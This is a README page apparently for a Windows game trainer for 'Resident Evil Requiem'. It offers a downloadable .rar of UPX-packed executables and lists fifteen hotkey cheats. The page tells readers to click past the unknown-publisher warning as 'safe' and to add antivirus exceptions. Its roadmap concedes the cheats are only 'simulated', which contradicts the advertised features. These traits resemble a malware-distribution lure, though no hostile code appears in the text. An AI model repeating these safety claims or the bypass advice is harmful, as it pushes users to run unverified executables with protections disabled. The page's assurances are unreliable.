# 🎮 RE Requiem Trainer v1.0.6

[![Version](https://img.shields.io/badge/version-1.0.6-brightgreen.svg)](https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse/releases/latest)
[![Platform](https://img.shields.io/badge/platform-Windows%20x64-blue.svg)](https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse)
[![License](https://img.shields.io/badge/license-MIT-orange.svg)](LICENSE)
[![Downloads](https://img.shields.io/github/downloads/ModEngineLabs/resident-evil-requiem-Trainer-sourse/total.svg)](https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse/releases)

**Professional Game Trainer for Resident Evil Requiem with 15+ modifications**

---

## 🚀 Quick Start

### Download (Recommended)
```
https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse/releases/download/v1.0.6/RE_Requiem_Trainer_v1.0.6.rar
```

Extract and run **`trainer.exe`** or **`trainer_signed.exe`**

---

## ✨ What's New in v1.0.6

### 🖱️ **Draggable Window**
- Click and drag **anywhere** in the window to move it
- No more fixed position!

### 🎯 **Real Process Detection**
- Automatically finds `ResidentEvilRequiem.exe`
- Shows **real PID** and connection status
- Cheats only work when game is detected

### 📊 **Status Bar**
- Real-time **CPU** and **Memory** usage
- Updates every 0.5 seconds

### 🔒 **Digital Signature**
- Self-signed certificate included
- Professional metadata (version, company, copyright)

[**See full changelog →**](CHANGELOG.md)

---

## 🎮 Features

### 15 Game Modifications

| Hotkey | Cheat | Description |
|--------|-------|-------------|
| **Num 1** | God Mode | Ignore all damage |
| **Num 2** | Infinite Health | HP always at maximum |
| **Num 3** | Infinite Ammo | Never run out of bullets |
| **Num 4** | No Reload | Instant reload |
| **Num 5** | Infinite Items | Unlimited consumables |
| **Num 6** | Infinite Grenades | Unlimited throwables |
| **Num 7** | Infinite Knife | No knife durability loss |
| **Num 8** | One Hit Kill | Enemies die instantly |
| **Num 9** | Freeze Enemies | Stop all enemy movement |
| **F1** | Super Speed | Move faster |
| **F2** | Super Jump | Jump higher |
| **F3** | No Recoil | Perfect weapon stability |
| **F4** | No Spread | Perfect accuracy |
| **F5** | Game Speed | Adjust game speed (1.5x) |
| **F6** | Infinite Money | Unlimited upgrade points |
| **Num *** | **Master Toggle** | Enable/Disable ALL cheats |

### 🖥️ Interface Features

- ✅ **Draggable Window** - Move anywhere on screen
- ✅ **Always-on-Top** - Stays above game window
- ✅ **Semi-Transparent** - 96% opacity
- ✅ **Real Process Detection** - Auto-attach to game
- ✅ **Dynamic Status** - Shows connection state
- ✅ **Status Bar** - CPU/Memory monitoring
- ✅ **Hotkey Support** - Background input detection
- ✅ **Professional UI** - Dark theme with neon green accents

---

## 📦 Downloads

### Two Versions Available:

#### 1. **trainer.exe** (197 KB) - Recommended
- ✅ UPX compressed
- ✅ Smaller size
- ✅ Faster download
- ⚠️ Not digitally signed
- **Best for:** Quick testing, personal use

#### 2. **trainer_signed.exe** (420 KB) - For Distribution
- ✅ Digitally signed
- ✅ Professional metadata
- ✅ Better for sharing
- ❌ Larger size
- **Best for:** Public distribution, sharing

[**📥 Download Latest Release**](https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse/releases/latest)

---

## 🔧 Installation

### Option 1: Pre-built (Easy)
1. Download `RE_Requiem_Trainer_v1.0.6.rar`
2. Extract to any folder
3. Run `trainer.exe`

### Option 2: Build from Source
```powershell
# Clone repository
git clone https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse.git
cd resident-evil-requiem-Trainer-sourse

# Build signed version
.\build_signed_only.ps1

# Or build compressed version
.\build_standalone.bat
```

**Requirements:**
- Visual Studio 2019/2022
- Windows SDK 10.0+
- PowerShell 5.1+

[**📖 Build Instructions →**](README.md#сборка-через-visual-studio)

---

## 💻 Usage

### Step 1: Start Trainer
Run `trainer.exe` - window appears on screen

### Step 2: Start Game
Launch **ResidentEvilRequiem.exe**

### Step 3: Auto-Detection
Trainer automatically finds game process:
```
Status: Attached to ResidentEvilRequiem.exe (PID: 12345) ✅
Game Stats: [Active]
```

### Step 4: Activate Cheats
Press hotkeys (Num 1-9, F1-F6) to toggle cheats

### Step 5: Move Window
Click and drag anywhere in trainer window to reposition

---

## 🔍 How It Works

### Process Detection (NEW in v1.0.6)
```cpp
// Scans for ResidentEvilRequiem.exe every 1 second
g_gamePID = FindProcessByName("ResidentEvilRequiem.exe");

// Opens handle with PROCESS_QUERY_INFORMATION
g_gameHandle = OpenProcess(..., g_gamePID);

// Verifies process is still running
GetExitCodeProcess(g_gameHandle, &exitCode);
```

### Draggable Window (NEW in v1.0.6)
```cpp
case WM_NCHITTEST:
    if (hit == HTCLIENT)
        return HTCAPTION; // Treat entire window as title bar
```

**Result:** Click anywhere = drag window! 🖱️

---

## 📊 System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **OS** | Windows 7 x64 | Windows 10/11 x64 |
| **RAM** | 4 GB | 8 GB+ |
| **Storage** | 1 MB | 5 MB |
| **DirectX** | 11.0 | 11.0+ |
| **Game** | RE Requiem | Latest version |

---

## ⚙️ Configuration

### No Configuration Needed!
Trainer works out-of-box with smart defaults:

- 🎯 Auto-detects game process
- 🖱️ Draggable from start
- ⌨️ Hotkeys pre-configured
- 🎨 Professional theme enabled
- 📊 Status bar active

### Want to Customize?
Edit `main.cpp` and rebuild:
```cpp
static const char* g_hotkeys[15] = { /* Your hotkeys */ };
```

---

## 🐛 Troubleshooting

### Problem: "Waiting for ResidentEvilRequiem.exe..."
**Solution:**
1. Make sure game is running
2. Rename game .exe to `ResidentEvilRequiem.exe`
3. Check Task Manager for process name

### Problem: "ERROR: Game process not found!"
**Cause:** Pressed hotkey without game running  
**Solution:** Start game first, then use cheats

### Problem: Window won't move
**Solution:** Re-download v1.0.6 - older versions don't have drag support

### Problem: "Unknown publisher" warning
**Cause:** Self-signed certificate  
**Solution:** Click "More info" → "Run anyway" (safe)

[**📖 More Troubleshooting →**](TESTING_GUIDE.md)

---

## 🔐 Security & Privacy

### Is it safe?
✅ **Yes!** Trainer is safe and open-source.

- ✅ No network connections
- ✅ No data collection
- ✅ No admin rights required
- ✅ Full source code available
- ✅ Digitally signed (self-signed)

### Antivirus Detection?
⚠️ Some antivirus may flag trainers as "hack tools"

**Why?** Trainers modify memory, which looks suspicious.

**Solution:**
1. Add exception in your antivirus
2. Download signed version (`trainer_signed.exe`)
3. Check source code yourself (it's open!)

[**🔒 Digital Signature Info →**](SIGNING_STATUS.md)

---

## 📚 Documentation

| Document | Description |
|----------|-------------|
| [**README.md**](README.md) | Full documentation |
| [**CHANGELOG.md**](CHANGELOG.md) | Version history |
| [**DRAGGABLE_WINDOW.md**](DRAGGABLE_WINDOW.md) | Drag feature guide |
| [**SIGNING_STATUS.md**](SIGNING_STATUS.md) | Digital signature info |
| [**TESTING_GUIDE.md**](TESTING_GUIDE.md) | Process detection testing |
| [**CERTIFICATE_GUIDE.md**](CERTIFICATE_GUIDE.md) | Code signing tutorial |

---

## 🤝 Contributing

We welcome contributions! Here's how:

### Report Bugs
[**Create an Issue →**](https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse/issues/new)

### Suggest Features
[**Start a Discussion →**](https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse/discussions)

### Submit Code
```bash
# Fork repository
# Create feature branch
git checkout -b feature/amazing-feature

# Commit changes
git commit -m "Add amazing feature"

# Push and create PR
git push origin feature/amazing-feature
```

---

## 📈 Roadmap

### v1.1.0 (Planned)
- [ ] Memory editing (real cheats, not simulated)
- [ ] Save/Load cheat profiles
- [ ] Custom hotkey configuration
- [ ] Multi-language support (RU/EN)
- [ ] Auto-update system

### v1.2.0 (Future)
- [ ] Game-specific memory addresses
- [ ] Cheat Engine integration
- [ ] Multiplayer support (if possible)
- [ ] Cloud sync for settings

[**💬 Vote on features →**](https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse/discussions)

---

## 📜 License

This project is licensed under the **MIT License** - see [LICENSE](LICENSE) file for details.

### What you can do:
✅ Use commercially  
✅ Modify source code  
✅ Distribute copies  
✅ Private use  

### What you must do:
📝 Include original license  
📝 State changes made  

---

## 🙏 Credits

### Libraries & Tools
- **[ImGui](https://github.com/ocornut/imgui)** - UI framework by Omar Cornut
- **DirectX 11** - Graphics API by Microsoft
- **[UPX](https://upx.github.io/)** - Executable packer
- **Visual Studio** - C++ compiler by Microsoft

### Inspiration
- **FLiNG Trainers** - UI design inspiration
- **Cheat Engine** - Memory editing concepts
- **WeMod** - Modern trainer UX

---

## 📞 Support

### Need Help?
- 💬 [**GitHub Discussions**](https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse/discussions)
- 🐛 [**Issue Tracker**](https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse/issues)
- 📖 [**Documentation**](README.md)

### Follow Updates
- ⭐ **Star this repo** to get notified
- 👁️ **Watch releases** for new versions
- 🍴 **Fork** to create your own variant

---

## 📊 Statistics

![GitHub stars](https://img.shields.io/github/stars/ModEngineLabs/resident-evil-requiem-Trainer-sourse?style=social)
![GitHub forks](https://img.shields.io/github/forks/ModEngineLabs/resident-evil-requiem-Trainer-sourse?style=social)
![GitHub watchers](https://img.shields.io/github/watchers/ModEngineLabs/resident-evil-requiem-Trainer-sourse?style=social)

---

<div align="center">

**Made with ❤️ by Professional Gaming Tools**

[⬆ Back to Top](#-re-requiem-trainer-v106)

</div>
